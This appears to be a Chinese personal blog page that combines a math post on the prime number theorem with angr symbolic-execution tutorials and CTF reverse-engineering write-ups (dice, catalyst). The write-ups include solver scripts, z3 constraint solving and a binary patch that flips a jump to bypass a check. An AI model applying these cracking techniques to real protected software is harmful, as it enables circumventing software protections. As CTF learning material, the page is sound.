<p>在黎曼的论文发表37年后，两条边终于被去掉了…</p>
<p>因此，<strong>质数定理</strong>和<strong>黎曼猜想</strong>的难度有数量级的差距</p>
<p>质数定理的内容，其实就是小于等于x的质数个数$\pi(x)≈Li(x)$</p>
<p>严格地说，当x趋于无穷时，两者比值趋于1</p>
<p>已经提高，在x很大时，$Li(x)≈\frac{x}{ln(x)}$，因此质数定理也可以表述为$\pi(x)\approx\frac{x}{ln(x)}$</p>
<p><img src="/2019/01/14/黎曼猜想的学习/26.jpg" alt="26"></p>
<p>从图中可以发现，随着x的增大，$\pi(x)$与这两种近似表达式的比例都趋于1</p>
<p>不过作为对$\pi(x)$的近似，Li(x)要好得多，不过这只是定量的区别，不是定性的区别</p>
<blockquote>
<p>用密度的语言说，<strong>在x附近的一个自然数是质数的概率，大约是$\frac{1}{ln(x)}$</strong>。同时，<strong>在小于等于x的自然数中任选一个是质数的概率，也大约是$\frac{1}{ln(x)}$</strong></p>
</blockquote>
<p>由此可见，质数定理构成了我们对质数分布的基础描述</p>
<p>而黎曼猜想表征的就是对这个基础描述的<strong>修正</strong></p>
<blockquote>
<p>再次重复，<strong>质数分布的全部信息都包含在黎曼$\zeta$函数的非平凡零点的位置之中</strong></p>
</blockquote>
<p>看到一段评论</p>
<blockquote>
<p>质数定理，相当于有人给你打了每句歌词字幕轴；<br>非平凡零点就是有人把文字填进去了；<br>而黎曼猜想是进一步打出了带特效的歌词时间轴。</p>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/13/符号执行-angr/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="purecall">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="vct的演算纸">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/13/符号执行-angr/" itemprop="url">符号执行-angr</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-13T17:44:24+08:00">
                2019-01-13
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2019/01/13/符号执行-angr/" class="leancloud_visitors" data-flag-title="符号执行-angr">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="angr基本使用"><a href="#angr基本使用" class="headerlink" title="angr基本使用"></a>angr基本使用</h1><p>根据官网教程安装非常非常非常麻烦…</p>
<p>照着这篇做<a href="http://pwn4.fun/2017/06/06/angr%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" target="_blank" rel="noopener">安装教程</a></p>
<h2 id="例1-r100"><a href="#例1-r100" class="headerlink" title="例1 r100"></a>例1 r100</h2><p>先试着做一个例题 r100</p>
<p>流程很简单，就是一个玩具</p>
<p><img src="/2019/01/13/符号执行-angr/1.png" alt="1"></p>
<p>就是要执行到0x400844，不能到0x400855</p>
<p>直接跑脚本，写的时候有几个奇奇怪怪的小问题</p>
<blockquote>
<p>import angr 和 from angr import * 不是一回事…</p>
<p>用后者一直报找不到angr</p>
</blockquote>
<p>还有就是proj的auto_load_libs，甚至文件名的单引号双引号都能让我这里跑不出结果…也是醉了</p>
<p><img src="/2019/01/13/符号执行-angr/2.png" alt="2"></p>
<h2 id="例2-ais3-cm"><a href="#例2-ais3-cm" class="headerlink" title="例2 ais3-cm"></a>例2 ais3-cm</h2><p><img src="/2019/01/13/符号执行-angr/3.png" alt="3"></p>
<p>这个程序有一个命令行参数输入</p>
<p>先给出解题代码</p>
<p><img src="/2019/01/13/符号执行-angr/4.png" alt="4"></p>
<p>其中BVS应该是创建一个bit向量，这里选择50*8个bit，也就是50字符</p>
<p>然后就是注意添加命令行参数的格式了</p>
<p>最后输出时用<code>cast_to=str</code>可以以ASCII形式输出</p>
<blockquote>
<p>safari刷新网站，cmd+r</p>
</blockquote>
<h2 id="例3-hash"><a href="#例3-hash" class="headerlink" title="例3 hash"></a>例3 hash</h2><p>题目给了源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"what?\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"you are wrong, sorry.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">	<span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"ha, you won't get it!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"h4cky0u"</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"so close, dude!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Brr wrrr grr\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Get your key: "</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%x\n"</span>, hash);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单编译一下，脚本比较好写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">'./hash'</span>,auto_load_libs = <span class="keyword">False</span>)</span><br><span class="line">argv1 = claripy.BVS(<span class="string">'argv1'</span>,<span class="number">10</span>*<span class="number">8</span>)</span><br><span class="line">argv2 = claripy.BVS(<span class="string">'argv2'</span>,<span class="number">10</span>*<span class="number">8</span>)</span><br><span class="line">argv3 = claripy.BVS(<span class="string">'argv3'</span>,<span class="number">10</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">state = proj.factory.entry_state(args=[<span class="string">"./hash"</span>,argv1,argv2,argv3])</span><br><span class="line"></span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line"></span><br><span class="line">simgr.explore(find=<span class="number">0x4007f8</span>)</span><br><span class="line"><span class="keyword">print</span> simgr.found[<span class="number">0</span>].solver.eval(argv1,cast_to=str)</span><br><span class="line"><span class="keyword">print</span> simgr.found[<span class="number">0</span>].solver.eval(argv2,cast_to=str)</span><br><span class="line"><span class="keyword">print</span> simgr.found[<span class="number">0</span>].solver.eval(argv3,cast_to=str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>值得注意的是，最后程序执行到了目标地址，我们需要获得程序的输出</p>
<p>也就是代码中的最后一行 <code>dumps(1)</code>，应该就是<code>stdout</code>的意思</p>
</blockquote>
<p>最后输出<code>Get your key: c0ffee</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/03/CTF的一些做题记录/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="purecall">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="vct的演算纸">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/03/CTF的一些做题记录/" itemprop="url">CTF的一些做题记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-03T15:51:12+08:00">
                2019-01-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2019/01/03/CTF的一些做题记录/" class="leancloud_visitors" data-flag-title="CTF的一些做题记录">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="RE-dice"><a href="#RE-dice" class="headerlink" title="RE-dice"></a>RE-dice</h1><p>主要就是扔骰子游戏，要扔3-1-3-3-7</p>
<p>根据字符串提示找到最后会输出的flag的位置，我这里是v84，按<code>alt+t</code>搜索文本v84，再按<code>ctrl+t</code>搜索下一个</p>
<p><code>flag =v84^v87</code></p>
<p>发现v84一开始被byte_xxx赋值了，找到数据，选中全部按<code>shift+E</code>，初始值保存十六进制数据到文本</p>
<p><code>132138153D3357472D276A73440526595C79174445771A75497D054A78746A70420271050F220800</code></p>
<p>然后跟进到第二个对v84操作处</p>
<p><img src="/2019/01/03/CTF的一些做题记录/1.png" alt="img1"></p>
<p>又要开始跟进v87了…</p>
<p>它也被byte_xxx赋初始值，提取数据<code>02370F350F3C15073C302A30551237151E35015100</code></p>
<p>跟进发现v87和v86异或了</p>
<p><img src="/2019/01/03/CTF的一些做题记录/2.png" alt="2"></p>
<p>再跟进，发现v87又和v85异或了</p>
<p><img src="/2019/01/03/CTF的一些做题记录/3.png" alt="3"></p>
<p>终于就结束了</p>
<p>最后<code>flag=v84^v87^v86^v85</code></p>
<p>那么我们先关注v86</p>
<blockquote>
<p>我终于不用再qq截图了… <code>cmd+shift+4 截图，选中文件return重命名</code></p>
</blockquote>
<p><img src="/2019/01/03/CTF的一些做题记录/4.png" alt="4"></p>
<p>v86被赋初值16,其他地方没有改动了</p>
<p>再关注v85，初值为6</p>
<p><img src="/2019/01/03/CTF的一些做题记录/5.png" alt="5"></p>
<blockquote>
<p>注意这里的time函数，也是反调试用的，比如od调试时time就会比较大，这里可以理解为程序运行时间超过2秒就乘以2</p>
</blockquote>
<p>所以这里我们只需要一次<code>v85*=2</code>即可</p>
<p> 接着根据31337的五次结果，总结一下所有操作就是</p>
<p><code>v85=6   *=2   +=4    *=3   +=2  *=2   *=50  /=50  +=65  -=65  *=42  /=42</code>  </p>
<p>算出<code>v85=100</code></p>
<p>最后写出解密代码（还是C好用）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v84 = <span class="string">"132138153D3357472D276A73440526595C79174445771A75497D054A78746A70420271050F2208"</span></span><br><span class="line">v87 = <span class="string">"02370F350F3C15073C302A30551237151E350151"</span></span><br><span class="line">v86 = <span class="number">16</span></span><br><span class="line">v85 = <span class="number">100</span></span><br><span class="line"></span><br><span class="line">v87 = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> v87.decode(<span class="string">'hex'</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(v87)):</span><br><span class="line">	v87[i]^=v85^v86</span><br><span class="line"></span><br><span class="line">v84 = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> v84.decode(<span class="string">'hex'</span>)]</span><br><span class="line"></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(v84)):</span><br><span class="line">	res += chr(v84[i]^v87[i%len(v87)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure>
<p>补充一些，IDA的流程图…….是可以拖动的</p>
<p><img src="/2019/01/03/CTF的一些做题记录/6.png" alt="6"></p>
<p>举个例子，比如我要把jnz改成jz，以机器码修改的方式</p>
<p><img src="/2019/01/03/CTF的一些做题记录/7.png" alt="7"></p>
<p>光标处改成8就差不多了，应该是机器码显示的长度（而不是进制，<del>因为我试了15</del>）</p>
<p><img src="/2019/01/03/CTF的一些做题记录/8.png" alt="8"></p>
<p>网上查一下发现JNZ就是这里的75，而JZ是74</p>
<p>patch一下</p>
<p><img src="/2019/01/03/CTF的一些做题记录/9.png" alt="9"></p>
<p>这样1/6的概率就变成5/6了，或者直接改成jmp更好</p>
<h1 id="RE-catalyst"><a href="#RE-catalyst" class="headerlink" title="RE-catalyst"></a>RE-catalyst</h1><blockquote>
<p>catalyst是催化剂的意思，应该就是让我们nop掉一堆的sleep吧</p>
</blockquote>
<p>直接找到关键部分</p>
<p><img src="/2019/01/03/CTF的一些做题记录/10.png" alt="10"></p>
<p>跟进第一个函数</p>
<p><img src="/2019/01/03/CTF的一些做题记录/11.png" alt="11"></p>
<p><img src="/2019/01/03/CTF的一些做题记录/12.png" alt="12"></p>
<p>显然这里是对username的长度进行了限制，复制代码，爆破一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>**argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>,result;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span> ( <span class="number">4</span> * (i &gt;&gt; <span class="number">2</span>) != i || <span class="number">4</span> * (i &gt;&gt; <span class="number">4</span>) == i &gt;&gt; <span class="number">2</span> || (result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i &gt;&gt; <span class="number">3</span>), !result) || i &gt;&gt; <span class="number">4</span> )&#123;</span><br><span class="line">			<span class="comment">// do nothing</span></span><br><span class="line">  		&#125;</span><br><span class="line"> 		<span class="keyword">else</span>&#123;</span><br><span class="line">  			<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i);</span><br><span class="line">  		&#125;</span><br><span class="line">  	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果是username长度只能是8或12，是第一个限制</p>
<blockquote>
<p>4 * (i &gt;&gt; 2) == i 实际表示i是4的倍数，懒得分析了直接爆破吧</p>
</blockquote>
<p>进入第二个函数，就是一堆运算</p>
<p><img src="/2019/01/03/CTF的一些做题记录/13.png" alt="13"></p>
<p>写一个z3的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">inp = [BitVec(<span class="string">'a%d'</span> %i, <span class="number">56</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>)]</span><br><span class="line">sol_1 = inp[<span class="number">0</span>] - inp[<span class="number">1</span>] + inp[<span class="number">2</span>]</span><br><span class="line">sol_2 = inp[<span class="number">1</span>] +<span class="number">3</span> *(inp[<span class="number">2</span>]+inp[<span class="number">0</span>])</span><br><span class="line">sol_3 = inp[<span class="number">2</span>]*inp[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(sol_1==<span class="number">1550207830</span>)</span><br><span class="line">s.add(sol_2==<span class="number">12465522610</span>)</span><br><span class="line">s.add(sol_3==<span class="number">3651346623716053780</span>)</span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line">m = s.model()</span><br><span class="line">r = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> inp:</span><br><span class="line">    <span class="keyword">print</span> m[i]</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<p><img src="/2019/01/03/CTF的一些做题记录/14.png" alt="14"></p>
<p>然后把长整型转换成字符串，<code>to_bytes</code>需要py3支持</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">userin = [<span class="number">1635017059</span>,<span class="number">1953724780</span>,<span class="number">1868915551</span>]</span><br><span class="line">username = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> userin:</span><br><span class="line">    username+=i.to_bytes(<span class="number">4</span>,<span class="string">'little'</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(username)</span><br></pre></td></tr></table></figure>
<p>每四个字节转成一个小端字符，再UTF-8解码</p>
<blockquote>
<p>输出： catalyst_ceo</p>
</blockquote>
<p>跟进第三个函数，发现没什么影响</p>
<p><img src="/2019/01/03/CTF的一些做题记录/15.png" alt="15"></p>
<p>继续第四个函数</p>
<p><img src="/2019/01/03/CTF的一些做题记录/16.png" alt="16"></p>
<p>这个没什么用…</p>
<p><img src="/2019/01/03/CTF的一些做题记录/17.png" alt="17"></p>
<p>这里主要是随机种子已经定下了，因此我们写另一个程序运行一下就好</p>
<p>第五个函数就是简单的异或</p>
<p>最终的exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> xor_bytes[]=&#123;</span><br><span class="line">    <span class="number">66</span>, <span class="number">19</span>, <span class="number">39</span>, <span class="number">98</span>, <span class="number">65</span>, <span class="number">53</span>, <span class="number">107</span>, <span class="number">15</span>, <span class="number">123</span>, <span class="number">70</span>, <span class="number">60</span>, <span class="number">62</span>, <span class="number">103</span>,</span><br><span class="line">	<span class="number">12</span>, <span class="number">8</span>, <span class="number">89</span>, <span class="number">68</span>, <span class="number">114</span>, <span class="number">54</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">84</span>, <span class="number">67</span>, <span class="number">56</span>, <span class="number">23</span>, <span class="number">29</span>,</span><br><span class="line">	<span class="number">24</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">92</span>, <span class="number">49</span>, <span class="number">33</span>, <span class="number">22</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">24</span>, <span class="number">20</span>, <span class="number">84</span>, <span class="number">89</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>*username = <span class="string">"catalyst_ceo"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>**argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">int</span>*ptr = (<span class="keyword">int</span>*)username;</span><br><span class="line">	srand(ptr[<span class="number">0</span>]+ptr[<span class="number">1</span>]+ptr[<span class="number">2</span>]);</span><br><span class="line">	a[<span class="number">0</span>] = rand()+<span class="number">0x55EB052A</span>;</span><br><span class="line">	a[<span class="number">1</span>] = rand()+<span class="number">0xEF76C39</span>;</span><br><span class="line">	a[<span class="number">2</span>] = rand()+<span class="number">0xCC1E2D64</span>;</span><br><span class="line">	a[<span class="number">3</span>] = rand()+<span class="number">0xC7B6C6F5</span>;</span><br><span class="line">	a[<span class="number">4</span>] = rand()+<span class="number">0x26941BFA</span>;</span><br><span class="line">	a[<span class="number">5</span>] = rand()+<span class="number">0x260CF0F3</span>;</span><br><span class="line">	a[<span class="number">6</span>] = rand()+<span class="number">0x10D4CAEF</span>;</span><br><span class="line">	a[<span class="number">7</span>] = rand()+<span class="number">0xC666E824</span>;</span><br><span class="line">	a[<span class="number">8</span>] = rand()+<span class="number">0xFC89459C</span>;</span><br><span class="line">	a[<span class="number">9</span>] = rand()+<span class="number">0x2413073A</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span>*flag = (<span class="keyword">char</span>*)a;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">40</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>,flag[i]^xor_bytes[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//ALEXCTF&#123;1_t41d_y0u_y0u_ar3__gr34t__reverser__s33&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>好多wp说这里a[]要设置成unsigned int，我感觉没道理啊…这里我跑出来没问题</p>
<p>也可以写个程序看看猜测的对不对，这里是因为前面太多sleep，懒得调试</p>
<p>不过以后如果出了问题可以考虑一下有/无符号的问题</p>
</blockquote>
<p>我可以清楚地控制C中的每一个bit，为什么要用python呢？</p>
<p>不完全归纳的结论：</p>
<p><strong>int + 32bits，不管后面的32bits是int还是uint，都等于int + 32bits（补）,貌似需要加一个前提（32bits）没超过int的上界</strong></p>
<p>也就是说，后面的32bits直接看成int就行了，不需要纠结有无符号</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/02/ubuntu的疑难杂症记录/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="purecall">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="vct的演算纸">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/02/ubuntu的疑难杂症记录/" itemprop="url">ubuntu的疑难杂症记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-02T21:02:49+08:00">
                2019-01-02
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2019/01/02/ubuntu的疑难杂症记录/" class="leancloud_visitors" data-flag-title="ubuntu的疑难杂症记录">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="snap安装失败导致apt报错"><a href="#snap安装失败导致apt报错" class="headerlink" title="snap安装失败导致apt报错"></a>snap安装失败导致apt报错</h1><ol>
<li><p><code>sudo gedit /var/lib/dpkg/info/snapd.prerm</code><br>在第一行后面插入一行： exit 0</p>
</li>
<li><p>然后卸载： <code>dpkg --purge --force-all snapd.</code></p>
</li>
</ol>
<p>发现还是有问题  <code>sudo aptitude remove snapd</code>   解决</p>
<h1 id="安装angr"><a href="#安装angr" class="headerlink" title="安装angr"></a>安装angr</h1><p><a href="http://pwn4.fun/2017/06/06/angr使用说明/" target="_blank" rel="noopener">不要看官网，根据这篇…</a></p>
<h1 id="代理（终端）"><a href="#代理（终端）" class="headerlink" title="代理（终端）"></a>代理（终端）</h1><p>SSR设置HTTP代理0.0.0.0 端口仍然是1087</p>
<p>ubuntu系统设置宿主机的ip，端口1087</p>
<p>终端里</p>
